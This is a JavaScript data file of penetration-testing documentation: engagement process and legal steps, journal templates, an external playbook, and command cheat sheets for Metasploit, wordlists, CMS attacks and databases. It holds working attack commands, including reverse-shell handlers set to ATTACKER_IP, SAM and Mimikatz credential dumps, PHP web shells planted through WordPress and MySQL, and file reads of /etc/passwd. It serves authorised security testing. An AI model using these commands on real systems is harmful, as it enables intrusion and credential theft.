/* ═══════════════════════════════════════════════════════════════════
   Security Tracker – Documentation Data
   ═══════════════════════════════════════════════════════════════════
   EDITING GUIDE
   ─────────────
   Each doc is an object in the `documentationEntries` array below.

   Doc structure:
     {
       id:          "unique_doc_id",        // snake_case, must be unique
       title:       "Display Title",
       category:    "Category Name",        // groups docs in the sidebar
       icon:        "emoji or symbol",      // shown in the doc list
       sections:    [ ...content sections... ]
     }

   Section structure:
     {
       heading:  "Section Heading",         // h2/h3 rendered heading
       level:    2 | 3,                     // heading level (2 = h2, 3 = h3)
       content:  "Paragraph text.",         // plain-text or simple markdown
       code:     "code block content",      // optional fenced code block
       list:     ["item 1", "item 2"],      // optional bulleted list
       numbered: true | false               // if true, list is ordered
     }

   Notes:
   • Sections are rendered in order top-to-bottom.
   • `content`, `code`, and `list` are all optional per section —
     include whichever fields are relevant.
   • To add a new doc, push a new object into `documentationEntries`.
   ═══════════════════════════════════════════════════════════════════ */

const documentationEntries = [
  {
    id: "pentest_process",
    title: "Pentest Process & Methodology",
    category: "Methodology",
    icon: "📋",
    sections: [
      {
        heading: "Penetration Testing Process Overview",
        level: 2,
        content: "A professional penetration test follows a structured process from initial client contact through final reporting. Each stage has specific deliverables and legal requirements that must be completed before proceeding."
      },

      /* NDA */
      {
        heading: "1. Non-Disclosure Agreement (NDA)",
        level: 2,
        content: "An NDA must be signed before ANY technical discussions, scoping, or information exchange. The NDA protects both parties — the client's sensitive data and the tester's methodology.\n\nNDA Types:"
      },
      {
        heading: "Unilateral NDA",
        level: 3,
        content: "One-way obligation. Only one party (usually the tester) is bound to confidentiality regarding the other party's information. Common when the client shares sensitive data but the tester does not."
      },
      {
        heading: "Bilateral NDA (Mutual)",
        level: 3,
        content: "Two-way obligation. Both parties agree to protect each other's confidential information. Most common in pentest engagements where both sides share sensitive details."
      },
      {
        heading: "Multilateral NDA",
        level: 3,
        content: "Three or more parties are involved, and at least one party shares information that must remain protected. Used when third-party vendors, subcontractors, or multiple stakeholders participate in the engagement."
      },

      /* Scoping */
      {
        heading: "2. Scoping & Questionnaire",
        level: 2,
        content: "After NDA is signed, a scoping questionnaire is sent to the client to define the engagement boundaries. This determines effort, timeline, and pricing."
      },
      {
        heading: "Internal Network Pentest Scoping Questions",
        level: 3,
        list: [
          "How many internal hosts/IPs are in scope?",
          "How many subnets/VLANs?",
          "Is Active Directory in scope?",
          "How many domains/forests?",
          "Are we testing from a domain-joined machine or unauthenticated?",
          "Is physical access testing in scope?",
          "Are wireless networks in scope?",
          "What are the goals (domain admin, specific data, compliance)?",
          "Any systems explicitly excluded?",
          "What are the testing windows (business hours, after hours)?"
        ],
        numbered: true
      },
      {
        heading: "External Network Pentest Scoping Questions",
        level: 3,
        list: [
          "How many external IPs/ranges/domains are in scope?",
          "Are web applications in scope (if so, how many)?",
          "Is social engineering/phishing in scope?",
          "Are cloud services (AWS/Azure/GCP) in scope?",
          "Is there an existing vulnerability scanning program?",
          "What constitutes a successful external breach for reporting?"
        ],
        numbered: true
      },
      {
        heading: "Web Application Scoping Questions",
        level: 3,
        list: [
          "How many web applications?",
          "How many unique pages/endpoints (small < 50, medium 50-200, large 200+)?",
          "Is it authenticated testing? How many roles?",
          "What technology stack (language, framework, CMS)?",
          "Is the API in scope? How many endpoints?",
          "Is source code available (white-box)?",
          "Is there a staging/test environment?"
        ],
        numbered: true
      },

      /* Pre-Engagement */
      {
        heading: "3. Pre-Engagement Meeting",
        level: 2,
        content: "After scoping, a formal pre-engagement meeting finalizes the legal and logistical framework. Key documents produced:"
      },
      {
        heading: "Master Service Agreement (MSA) / Contract",
        level: 3,
        list: [
          "Defines the business relationship, payment terms, liability limitations",
          "Usually a standing contract that covers multiple engagements",
          "References the Rules of Engagement (RoE) for specific testing boundaries"
        ]
      },
      {
        heading: "Statement of Work (SoW)",
        level: 3,
        list: [
          "Specific to each engagement under the MSA",
          "Defines: scope, timeline, deliverables, IP ranges, testing type",
          "Must be signed by authorized client representative",
          "Acts as your legal authorization to test — never start without it"
        ]
      },
      {
        heading: "Rules of Engagement (RoE)",
        level: 3,
        list: [
          "Testing hours and blackout windows",
          "Allowed attack types and any exclusions",
          "Communication procedures and emergency contacts",
          "Data handling and cleanup requirements",
          "Rate limiting and DoS restrictions",
          "Third-party systems / cloud provider notification requirements"
        ]
      },

      /* Kick-Off */
      {
        heading: "4. Kick-Off Meeting",
        level: 2,
        content: "Held immediately before testing begins. All stakeholders align on expectations and logistics."
      },
      {
        heading: "Required Participants",
        level: 3,
        list: [
          "Lead Pentester / Test Manager",
          "Client IT/Security POC (primary contact during testing)",
          "Client Management Stakeholder (someone who can authorize scope changes)",
          "SOC/IR Team Lead (if they need to be aware of testing traffic)"
        ]
      },
      {
        heading: "Kick-Off Agenda",
        level: 3,
        list: [
          "Review scope and RoE — confirm nothing has changed",
          "Exchange emergency contact information",
          "Confirm testing IP addresses and VPN/access credentials",
          "Agree on status update cadence (daily email, Slack, etc.)",
          "Discuss critical finding notification process",
          "Confirm report delivery timeline and format"
        ],
        numbered: true
      },

      /* Testing */
      {
        heading: "5. Testing Execution",
        level: 2,
        content: "The actual penetration test follows the methodology phases tracked in this application: OSINT → Enumeration → Exploitation → AD Exploitation → Post-Exploitation → Persistence.\n\nDuring testing:"
      },
      {
        heading: "Daily Operations",
        level: 3,
        list: [
          "Send daily status updates to client POC",
          "Report critical/high findings immediately (don't wait for the report)",
          "Maintain detailed logs of all actions with timestamps",
          "Screenshot every significant finding as you go",
          "Track all credentials obtained and access levels achieved",
          "Document cleanup actions needed"
        ]
      },

      /* Reporting */
      {
        heading: "6. Reporting & Debrief",
        level: 2,
        content: "The report is the primary deliverable. It must be clear, actionable, and suitable for both technical and executive audiences."
      },
      {
        heading: "Report Structure",
        level: 3,
        list: [
          "Executive Summary — business impact, risk rating, key findings (1-2 pages, non-technical)",
          "Scope & Methodology — what was tested, how, and when",
          "Findings — each with: title, severity (CVSS), description, evidence (screenshots/logs), remediation",
          "Attack Narrative — chronological walkthrough of the attack path",
          "Remediation Summary — prioritized table of all findings and fixes",
          "Appendices — raw scan data, full credential lists, tool output"
        ],
        numbered: true
      },
      {
        heading: "Debrief Meeting",
        level: 3,
        list: [
          "Walk through findings with technical and management teams",
          "Demonstrate critical attack paths live if requested",
          "Answer questions and provide context for remediation priorities",
          "Agree on retest timeline for critical findings",
          "Confirm all test artifacts/backdoors have been cleaned up"
        ]
      }
    ]
  },

  {
    id: "pentest_journal",
    title: "Pentest Journal Template",
    category: "Methodology",
    icon: "📓",
    sections: [
      {
        heading: "Pentest Journal — Documentation Template",
        level: 2,
        content: "Use this template structure to maintain organized notes throughout an engagement. Consistent documentation is critical for report writing, team handoffs, and reproducing findings.\n\nKeep entries updated in real-time — retroactive documentation is always incomplete."
      },

      /* Overview */
      {
        heading: "Engagement Overview Table",
        level: 2,
        content: "Track high-level engagement metadata.",
        code: "┌────────────────┬──────────────────────────────────────────────┐\n│ Field          │ Value                                        │\n├────────────────┼──────────────────────────────────────────────┤\n│ Engagement Name│ [Client Name] - [Test Type]                  │\n│ Time Frame     │ [Start Date] - [End Date]                    │\n│ Test Type      │ Internal / External / Web App / AD / Wireless│\n│ Tester(s)      │ [Names]                                      │\n│ Client POC     │ [Name, Email, Phone]                         │\n│ Scope          │ [IP ranges / URLs / domains]                 │\n│ Description    │ [Brief engagement description and goals]     │\n└────────────────┴──────────────────────────────────────────────┘"
      },

      /* Machines */
      {
        heading: "Machine Tracking Table",
        level: 2,
        content: "One row per discovered/targeted host. Update as you enumerate.",
        code: "┌──────────────┬───────────────┬────────┬──────────────────┬──────────────────┐\n│ Name/Host    │ IP Address    │ OS     │ Open Ports       │ Notes            │\n├──────────────┼───────────────┼────────┼──────────────────┼──────────────────┤\n│ DC01         │ 10.10.20.10   │ Win19  │ 53,88,389,445    │ Domain Controller│\n│ WEB01        │ 10.10.20.50   │ Ubuntu │ 22,80,443        │ Apache/WordPress │\n│ FILE01       │ 10.10.20.30   │ Win16  │ 445,3389         │ SMB shares open  │\n└──────────────┴───────────────┴────────┴──────────────────┴──────────────────┘"
      },

      /* Attacks & Payloads */
      {
        heading: "Attacks & Payloads Log",
        level: 2,
        content: "Document every exploitation attempt, successful or not.",
        code: "┌──────────┬──────────────────┬──────────────────┬──────────────────┬────────┐\n│ Machine  │ Attack Vector    │ Prerequisites    │ Payload/Tool     │ Result │\n├──────────┼──────────────────┼──────────────────┼──────────────────┼────────┤\n│ WEB01    │ SQLi → RCE       │ Web login creds  │ sqlmap --os-shell│ Shell  │\n│ DC01     │ Kerberoast       │ Domain user      │ GetUserSPNs.py   │ Hash   │\n│ FILE01   │ PSExec           │ Admin hash       │ impacket-psexec  │ SYSTEM │\n└──────────┴──────────────────┴──────────────────┴──────────────────┴────────┘"
      },

      /* Credentials */
      {
        heading: "Credentials Table",
        level: 2,
        content: "Track ALL credentials obtained — crucial for report and cleanup.",
        code: "┌──────────────┬──────────────────────────────────────┬──────────────┬──────────┐\n│ Username     │ Hash                                 │ Password     │ Source   │\n├──────────────┼──────────────────────────────────────┼──────────────┼──────────┤\n│ svc_sql      │ aad3b435b51404eeaad3b435b51404ee:... │ Summer2024!  │ Kerbroast│\n│ admin        │ -                                    │ P@ssw0rd123  │ Web login│\n│ Administrator│ 31d6cfe0d16ae931b73c59d7e0c089c0:... │ -            │ SAM dump │\n└──────────────┴──────────────────────────────────────┴──────────────┴──────────┘",
        list: [
          "Record the source of every credential (where/how it was obtained)",
          "Note which systems each credential provides access to",
          "Track whether credentials were cracked or used as pass-the-hash",
          "Flag any shared/reused passwords across systems"
        ]
      },

      /* Journal */
      {
        heading: "Activity Journal",
        level: 2,
        content: "Timestamped log of every significant action. This is your audit trail.",
        code: "┌─────────────────────┬──────────┬─────────────────────────────────────────────┐\n│ Timestamp           │ Machine  │ Action / Note                               │\n├─────────────────────┼──────────┼─────────────────────────────────────────────┤\n│ 2024-03-15 09:00    │ -        │ Engagement started, VPN connected            │\n│ 2024-03-15 09:15    │ ALL      │ Nmap SYN scan of 10.10.20.0/24              │\n│ 2024-03-15 10:30    │ WEB01    │ Found SQLi in /login.php - param: username  │\n│ 2024-03-15 11:00    │ WEB01    │ Got shell as www-data via sqlmap --os-shell  │\n│ 2024-03-15 14:00    │ DC01     │ Kerberoasted svc_sql, cracking offline      │\n│ 2024-03-15 15:30    │ DC01     │ svc_sql cracked: Summer2024! — DA member    │\n│ 2024-03-15 16:00    │ -        │ Notified client of critical finding (DA)    │\n└─────────────────────┴──────────┴─────────────────────────────────────────────┘"
      },

      /* Tips */
      {
        heading: "Documentation Best Practices",
        level: 2,
        list: [
          "Screenshot EVERYTHING before and after exploitation",
          "Record exact commands used — copy/paste from terminal history",
          "Note timestamps in UTC or the client's timezone (be consistent)",
          "Document failed attempts too — they show thoroughness and help avoid repeats",
          "Save raw tool output (nmap XML, Nessus exports, BloodHound data)",
          "Keep a running list of cleanup tasks (backdoors, accounts, files to remove)",
          "Update credential table immediately when new creds are found",
          "Tag findings with severity as you discover them — don't wait for report writing"
        ]
      }
    ]
  },

  {
    id: "external_pentest_playbook",
    title: "External Pentest Playbook",
    category: "Methodology",
    icon: "👽",
    sections: [
      {
        heading: "External Penetration Test Playbook",
        level: 2,
        content: "Step-by-step operational playbook for external network penetration tests. Follow this checklist to ensure complete coverage from pre-engagement through cleanup."
      },

      /* Pre-Test */
      {
        heading: "Pre-Test Checklist",
        level: 2,
        list: [
          "Ensure Rules of Engagement (RoE) is signed by the client",
          "Add all in-scope IPs/domains to your scope tracking",
          "Verify customer scope ownership (use bgp.he.net, whois, ARIN lookups)",
          "Send kick-off email with your testing IP and contact information",
          "Confirm emergency contacts and critical finding notification process"
        ],
        numbered: true
      },
      {
        heading: "Kick-Off Email Template",
        level: 3,
        code: "Hi [CLIENT],\n\nThe external penetration test is about to begin. Per our agreement,\nwe will be testing the following IPs/ranges:\n\n[SCOPE IPs/RANGES]\n\nAll pentesting activity will be performed from the following IP address:\n\n[YOUR TESTING IP]\n\nIf our testing triggers any alerting for you, please notify us at\nyour earliest convenience so we can notate this in our report.\nFinally, if you need anything at all during the testing, you can\nreach me at this email or by the phone number listed in my signature.\n\nThank you,\n[YOUR NAME]"
      },

      /* Information Gathering */
      {
        heading: "Information Gathering",
        level: 2,
        content: "OSINT and reconnaissance tasks to perform before active scanning."
      },
      {
        heading: "Hunting Breached Credentials",
        level: 3,
        list: [
          "Search breach databases for client domain emails (DeHashed, IntelX, HaveIBeenPwned)",
          "Look for credential dumps on paste sites and dark web sources",
          "Search GitHub/GitLab for accidentally committed credentials",
          "Check for cloud storage buckets with exposed data (GrayhatWarfare)"
        ]
      },
      {
        heading: "Identifying Employees and Emails",
        level: 3,
        list: [
          "LinkedIn employee enumeration — build employee list",
          "Determine email format using Hunter.io, email-format.com, or manual testing",
          "Verify email addresses with SMTP VRFY or RCPT TO enumeration",
          "Build targeted username/email lists from OSINT findings"
        ]
      },
      {
        heading: "Enumerating Valid Accounts",
        level: 3,
        list: [
          "Test for username enumeration on login portals (timing attacks, error messages)",
          "Check password reset flows for account validation leaks",
          "Validate email addresses against O365 using o365creeper or similar",
          "Enumerate accounts on VPN portals, OWA, Citrix, and other edge services"
        ]
      },

      /* Vulnerability Scanning */
      {
        heading: "Vulnerability Scanning",
        level: 2,
        list: [
          "Conduct vulnerability scanning with Nessus or OpenVAS across all in-scope IPs",
          "Run web application scans (Nikto, Burp Suite, nuclei) on discovered web services",
          "Check for SSL/TLS misconfigurations (testssl.sh, sslscan)",
          "Identify outdated software and known CVEs from service banners",
          "Validate scanner findings manually — eliminate false positives before reporting"
        ]
      },

      /* Attacking Login Portals */
      {
        heading: "Attacking Login Portals",
        level: 2,
        content: "External login portals are primary targets. Test each discovered portal systematically."
      },
      {
        heading: "Attacking O365 / Microsoft 365",
        level: 3,
        list: [
          "Enumerate valid users via Azure/MSOL endpoints",
          "Password spray with common passwords (Season+Year pattern: Winter2024!)",
          "Check for legacy authentication protocols that bypass MFA",
          "Test OAuth/SAML misconfigurations",
          "Look for Azure AD conditional access policy gaps"
        ],
        code: "# Common spray passwords\nWinter2024!\nSpring2024!\nSummer2024!\nPassword1!\nWelcome1!\n[CompanyName]2024!\n\n# Tools: MSOLSpray, o365spray, TREVORspray"
      },
      {
        heading: "Attacking OWA (Outlook Web Access)",
        level: 3,
        list: [
          "Identify OWA version from response headers and login page",
          "Password spray with validated usernames",
          "Attempt internal phishing or mail relay if access is gained",
          "Search mailbox for sensitive data, credentials, internal documentation",
          "Check for Exchange CVEs (ProxyLogon, ProxyShell, ProxyNotShell)"
        ]
      },
      {
        heading: "Other Portals",
        level: 3,
        list: [
          "VPN portals (Cisco AnyConnect, GlobalProtect, Pulse Secure) — spray and check for CVEs",
          "Citrix/RDP Gateway — test default creds, spray, check for known vulns",
          "Custom web applications — full web app testing methodology",
          "Admin panels (WordPress /wp-admin, phpMyAdmin, etc.) — default creds, brute force",
          "API endpoints — check for authentication bypass, broken access controls"
        ]
      },
      {
        heading: "Bypassing MFA",
        level: 3,
        list: [
          "Check if MFA is consistently enforced across all services (O365, VPN, OWA, etc.)",
          "Test for MFA bypass via legacy protocols (IMAP, POP3, ActiveSync, SMTP)",
          "Look for MFA fatigue / push notification abuse opportunities",
          "Check for session token replay after MFA completion",
          "Test if MFA is required for all authentication flows (API keys, app passwords)"
        ]
      },

      /* Escalation & Manual Testing */
      {
        heading: "Manual Testing & Exploitation",
        level: 2,
        list: [
          "Conduct manual testing on all identified services and findings",
          "Validate scanning tool vulnerabilities (remove false positives)",
          "Test for password spraying and brute-force on all discovered logins",
          "Attempt to escalate access from external to internal network",
          "Validate any previous year findings have been resolved"
        ]
      },

      /* Escalating Access */
      {
        heading: "Escalating External to Internal",
        level: 2,
        content: "If you breach the perimeter (credentials, RCE, VPN access), immediately pivot to internal testing objectives.",
        list: [
          "Use gained credentials on VPN/RDP to establish internal network access",
          "Leverage compromised email for internal phishing or information gathering",
          "Exploit any RCE to establish C2 and begin internal enumeration",
          "Connect to internal services discovered through breached portals",
          "Any cloud access gained — enumerate IAM, storage, compute resources"
        ]
      },

      /* Common Findings */
      {
        heading: "Common External Pentest Findings",
        level: 2,
        list: [
          "Default or weak credentials on edge services",
          "Missing MFA on external-facing portals",
          "Open mail relays (test via: nmap -p 25 --script smtp-open-relay TARGET)",
          "Outdated SSL/TLS configurations (weak ciphers, expired certificates)",
          "Information disclosure in HTTP headers, error pages, or public repos",
          "Subdomain takeover vulnerabilities",
          "Exposed management interfaces (SSH, RDP, admin panels)",
          "DNS zone transfer allowed",
          "Missing SPF/DKIM/DMARC email security records",
          "Known CVEs in unpatched external services"
        ]
      },

      /* Cleanup */
      {
        heading: "Post-Test Cleanup",
        level: 2,
        list: [
          "Remove all uploaded tools, scripts, and payloads from client systems",
          "Delete any accounts created during testing",
          "Remove persistence mechanisms planted during testing",
          "Document all changes made to client environment",
          "Notify client of any remaining artifacts that require their action",
          "Confirm all testing traffic has stopped"
        ]
      }
    ]
  },

  {
    id: "metasploit",
    title: "Metasploit",
    category: "Frameworks",
    icon: "🎯",
    sections: [
      {
        heading: "Initial Setup",
        level: 2,
        content: "Metasploit requires PostgreSQL for workspace/database features. Initialize the database before first use.",
        code: "# Start PostgreSQL and initialize MSF database\nsudo systemctl start postgresql\nsudo msfdb init\n\n# Launch Metasploit (quiet mode)\nmsfconsole -q\n\n# Verify database connection\ndb_status"
      },
      {
        heading: "Workspace Management",
        level: 2,
        content: "Workspaces isolate engagement data (hosts, services, credentials, loot). Always create a dedicated workspace per engagement.",
        code: "# Create a new workspace\nworkspace -a ENGAGEMENT_NAME\n\n# List all workspaces\nworkspace\n\n# Switch workspace\nworkspace ENGAGEMENT_NAME\n\n# Delete a workspace\nworkspace -d OLD_WORKSPACE\n\n# View discovered data in current workspace\nhosts\nservices\nservices -p 445\ncreds\nloot"
      },
      {
        heading: "Module Search & Usage",
        level: 2,
        content: "Metasploit organizes exploits, auxiliary modules, and post modules. Search by CVE, name, platform, or type.",
        code: "# Search by CVE\nsearch cve:2021-44228\n\n# Search by type and keyword\nsearch type:exploit name:eternalblue\nsearch type:exploit platform:windows smb\n\n# Use a module\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Show options, payloads, and info\nshow options\nshow payloads\ninfo\n\n# Set required options\nset RHOSTS TARGET_IP\nset LHOST ATTACKER_IP\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Run the exploit\nrun\n# Or: exploit"
      },
      {
        heading: "Auxiliary Modules (Scanning & Recon)",
        level: 2,
        content: "Auxiliary modules perform scanning, enumeration, and brute-force — no exploit payload involved. Use these during the enumeration phase.",
        code: "# Port scanning\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS SUBNET/24\nset THREADS 50\nrun\n\n# SMB version detection\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS TARGET_IP\nrun\n\n# HTTP directory scanning\nuse auxiliary/scanner/http/dir_scanner\nset RHOSTS TARGET_IP\nrun\n\n# SMB login brute-force\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS TARGET_IP\nset USER_FILE users.txt\nset PASS_FILE passwords.txt\nrun\n\n# Nmap from within msfconsole (results stored in DB)\ndb_nmap -sV -sC TARGET_IP"
      },
      {
        heading: "multi/handler",
        level: 2,
        content: "The multi/handler catches incoming connections from payloads generated with msfvenom. The PAYLOAD must match exactly what msfvenom used (staged vs stageless, architecture).",
        code: "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST ATTACKER_IP\nset LPORT 4444\nset ExitOnSession false\nexploit -j\n\n# -j runs in background as a job\n# ExitOnSession false keeps listener alive for multiple callbacks"
      },
      {
        heading: "Meterpreter Post-Exploitation",
        level: 2,
        content: "Meterpreter is Metasploit's post-exploitation shell. It runs in-memory, provides file operations, pivoting, credential harvesting, and process manipulation.",
        code: "# System information\nsysinfo\ngetuid\ngetpid\n\n# Privilege escalation\ngetsystem\n\n# Process migration (move to a stable SYSTEM process to avoid shell death)\nps                    # List processes\nmigrate <PID>         # Migrate to target PID (e.g., explorer.exe, svchost.exe)\n\n# Credential harvesting\nhashdump              # Dump SAM hashes\nload kiwi             # Load Mimikatz extension\ncreds_all             # Dump all credentials\n\n# File operations\ndownload C:\\\\Users\\\\Admin\\\\Desktop\\\\secrets.txt /tmp/\nupload /tmp/tool.exe C:\\\\Windows\\\\Temp\\\\\n\n# Drop to OS shell\nshell\n# Ctrl+Z to background shell\n\n# Session management\nbackground            # Background current session\nsessions -l           # List all sessions\nsessions -i 1         # Interact with session 1"
      },
      {
        heading: "Pivoting & Port Forwarding",
        level: 2,
        content: "Use Meterpreter's autoroute and portfwd to reach internal networks through a compromised host.",
        code: "# Add route to internal subnet through session\nrun autoroute -s 10.10.20.0/24\n\n# Alternatively:\nrun post/multi/manage/autoroute\n\n# Port forwarding — access internal service on your local machine\nportfwd add -l 3389 -p 3389 -r 10.10.20.15\n# Now connect locally: rdesktop 127.0.0.1:3389\n\n# SOCKS proxy through Meterpreter\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j\n# Configure proxychains: socks5 127.0.0.1 1080"
      },
      {
        heading: "Useful Post Modules",
        level: 2,
        code: "# Windows local enumeration\nrun post/windows/gather/enum_logged_on_users\nrun post/windows/gather/enum_shares\nrun post/windows/gather/checkvm\n\n# Suggest local exploits\nrun post/multi/recon/local_exploit_suggester\n\n# Persistence (for authorized engagements)\nrun post/windows/manage/persistence_exe REXENAME=svchost.exe START=SESSION"
      }
    ]
  },

  {
    id: "custom_wordlists",
    title: "Custom Wordlists (crunch & cewl)",
    category: "Credential Attacks",
    icon: "🧠",
    sections: [
      {
        heading: "crunch",
        level: 2,
        content: "Use crunch for patterned wordlists (length, charset, mask).",
        code: "# Length 8 only, lowercase\ncrunch 8 8 abcdefghijklmnopqrstuvwxyz -o words.txt\n\n# Pattern: Season+Year style\ncrunch 10 10 -t Summer%%%% -o summer_year.txt\n\n# Custom charset\ncrunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o custom.txt"
      },
      {
        heading: "cewl",
        level: 2,
        content: "Use cewl to scrape organization-specific words from websites.",
        code: "# Basic scrape\ncewl -w cewl_words.txt -d 2 -m 5 https://target.tld\n\n# Include metadata and emails\ncewl -w words.txt --meta_file meta.txt -e https://target.tld"
      },
      {
        heading: "Workflow",
        level: 2,
        numbered: true,
        list: [
          "Generate context words with cewl",
          "Generate patterns with crunch",
          "Merge and deduplicate: sort -u",
          "Apply simple mangling rules (year, symbols, case)",
          "Use targeted list before large generic lists"
        ],
        code: "cat cewl_words.txt summer_year.txt | tr '[:upper:]' '[:lower:]' | sort -u > final_wordlist.txt"
      }
    ]
  },

  {
    id: "content_management_systems",
    title: "Content Management Systems",
    category: "Web Exploitation",
    icon: "🧱",
    sections: [
      {
        heading: "WordPress",
        level: 2,
        content: "Most popular CMS — powers ~40% of websites. Default admin panel at /wp-admin. Plugins and themes are the primary attack surface. Always enumerate before attempting exploits.",
        code: "# Full enumeration: vulnerable plugins, themes, and users\nwpscan --url http://TARGET --enumerate vp,vt,u --api-token YOUR_TOKEN\n\n# Aggressive plugin detection (slower, finds more)\nwpscan --url http://TARGET --enumerate ap --plugins-detection aggressive\n\n# Password brute force (authorized testing only)\nwpscan --url http://TARGET -U users.txt -P /usr/share/wordlists/rockyou.txt"
      },
      {
        heading: "WordPress — Theme Editor RCE",
        level: 3,
        content: "If you have admin credentials, you can inject a web shell via the built-in theme editor. This is one of the most reliable ways to get code execution after obtaining WP admin access.",
        numbered: true,
        list: [
          "Log in to /wp-admin with admin credentials",
          "Navigate to Appearance → Theme Editor (or /wp-admin/theme-editor.php)",
          "Select an unused theme (e.g., Twenty Twenty-One) from the dropdown",
          "Click 404.php (or any template file)",
          "Replace the contents with: <?php system($_GET['cmd']); ?>",
          "Click Update File",
          "Trigger the shell: curl http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=whoami",
          "For a full reverse shell, URL-encode and pass a bash/PowerShell payload as the cmd parameter"
        ]
      },
      {
        heading: "WordPress — Key Paths",
        level: 3,
        code: "# Important file locations\n/wp-config.php          # DB credentials, auth keys, salts\n/wp-login.php           # Login page\n/wp-admin/              # Admin dashboard\n/xmlrpc.php             # XML-RPC (brute force amplification)\n/wp-content/uploads/    # Uploaded files\n/wp-content/plugins/    # Installed plugins\n/wp-content/themes/     # Installed themes\n/wp-json/wp/v2/users    # REST API user enumeration"
      },
      {
        heading: "Drupal",
        level: 2,
        content: "Enterprise-grade CMS often found in government and large orgs. Vulnerable versions are common targets. Drupalgeddon (CVE-2018-7600) and Drupalgeddon2 still widely exploitable.",
        code: "# Scan with droopescan\ndroopescan scan drupal -u http://TARGET\n\n# Check version\ncurl -s http://TARGET/CHANGELOG.txt | head -5\n\n# Key paths to check\n/CHANGELOG.txt          # Version disclosure\n/core/CHANGELOG.txt     # Drupal 8+ version\n/user/login             # Login page\n/admin                  # Admin panel\n/node/1                 # First content node"
      },
      {
        heading: "Joomla",
        level: 2,
        content: "Third most popular CMS. Common in small-to-medium businesses. Extensions are the primary attack surface — many have known vulnerabilities.",
        code: "# Scan with JoomScan\njoomscan -u http://TARGET\n\n# Manual version check\ncurl -s http://TARGET/administrator/manifests/files/joomla.xml | grep version\n\n# Key paths\n/administrator/         # Admin login panel\n/configuration.php      # DB credentials (not directly accessible but useful post-shell)\n/robots.txt             # May reveal hidden directories"
      },
      {
        heading: "CMS Discovery & Fingerprinting",
        level: 2,
        content: "Before running CMS-specific tools, identify what CMS is running.",
        code: "# Automated CMS detection\nwhatweb http://TARGET\n\n# Check common paths manually\ncurl -s http://TARGET/wp-login.php    # WordPress\ncurl -s http://TARGET/user/login      # Drupal\ncurl -s http://TARGET/administrator/  # Joomla\n\n# Inspect response headers and HTML source\ncurl -sI http://TARGET | grep -i 'x-powered-by\\|x-generator\\|server'\ncurl -s http://TARGET | grep -i 'wp-content\\|drupal\\|joomla\\|generator'"
      },
      {
        heading: "Git Repository Discovery",
        level: 2,
        content: "Exposed .git directories leak source code, credentials, and historical changes. Common finding when developers deploy directly from git.",
        code: "# Check if .git is exposed\ncurl -s http://TARGET/.git/HEAD\n\n# Dump entire repository\ngit-dumper http://TARGET/.git ./dumped_repo\n\n# Analyze commit history for secrets\ncd dumped_repo\ngit log --oneline\ngit diff HEAD~5   # Check last 5 commits for sensitive changes\ngit log -p -- '*.conf' '*.config' '*.env'   # Search config file changes"
      },
      {
        heading: "CMS Workflow",
        level: 2,
        numbered: true,
        list: [
          "Fingerprint CMS and exact version (whatweb, response headers, CHANGELOG.txt)",
          "Run CMS-specific scanner (wpscan, droopescan, joomscan)",
          "Enumerate plugins/modules/themes — these are the primary attack surface",
          "Map known CVEs to discovered versions (searchsploit, Google)",
          "Test for default/weak credentials on admin panels",
          "If admin access obtained: use built-in editors/uploaders for code execution (e.g., WP Theme Editor)",
          "Post-shell: extract database credentials from config files (wp-config.php, settings.php, configuration.php)",
          "Document all artifacts and access methods for the report"
        ]
      }
    ]
  },

  {
    id: "database_operations",
    title: "Databases",
    category: "Post-Exploitation",
    icon: "🗄️",
    sections: [
      {
        heading: "PostgreSQL",
        level: 2,
        content: "Default port 5432. Common in web applications (Django, Rails, custom apps). Look for credentials in config files, environment variables, or .pgpass.",
        code: "# Connect to PostgreSQL\npsql -h TARGET_IP -p 5432 -U USER -d DATABASE\n\n# Enable expanded display for wide tables\n\\x on\n\n# List all databases\n\\l\n\n# Connect to a specific database\n\\c DATABASE_NAME\n\n# List all tables in current database\n\\dt\n\n# List all users and roles\n\\du\n\n# Describe a table structure\n\\d TABLE_NAME\n\n# Query data\nSELECT * FROM TABLE_NAME;\n\n# Read local files (if superuser)\nSELECT pg_read_file('/etc/passwd');\n\n# Command execution via COPY (if superuser)\nCOPY (SELECT '') TO PROGRAM 'id';"
      },
      {
        heading: "MySQL / MariaDB",
        level: 2,
        content: "Default port 3306. Found in LAMP stacks, WordPress, and many web applications. MariaDB is a MySQL fork with identical syntax.",
        code: "# Connect to MySQL/MariaDB\nmysql -h TARGET_IP -u USER -p PASSWORD -P 3306\n\n# MariaDB specific client\nmariadb -h TARGET_IP -u USER -p PASSWORD\n\n# Skip SSL verification (common in labs)\nmysql -h TARGET_IP -u USER -p PASSWORD --skip-ssl-verify-server-cert\n\n# Check version and current user\nSELECT version();\nSELECT system_user();\nSELECT current_user();\n\n# List databases and switch\nSHOW DATABASES;\nUSE database_name;\n\n# Show tables and query\nSHOW TABLES;\nSELECT * FROM table_name;\nSELECT * FROM table_name \\G   # Vertical display for wide rows\n\n# Dump user credentials\nSELECT user, authentication_string FROM mysql.user;\n\n# Read local files (requires FILE privilege)\nSELECT LOAD_FILE('/etc/passwd');\n\n# Write web shell (requires FILE privilege + writable web root)\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n\n# Modify application data (e.g., reset admin password)\nUPDATE users SET password='NEW_HASH' WHERE username='admin';"
      },
      {
        heading: "MSSQL",
        level: 2,
        content: "Default port 1433. Found in Windows enterprise environments, often linked to Active Directory service accounts. MSSQL offers powerful command execution via xp_cmdshell.",
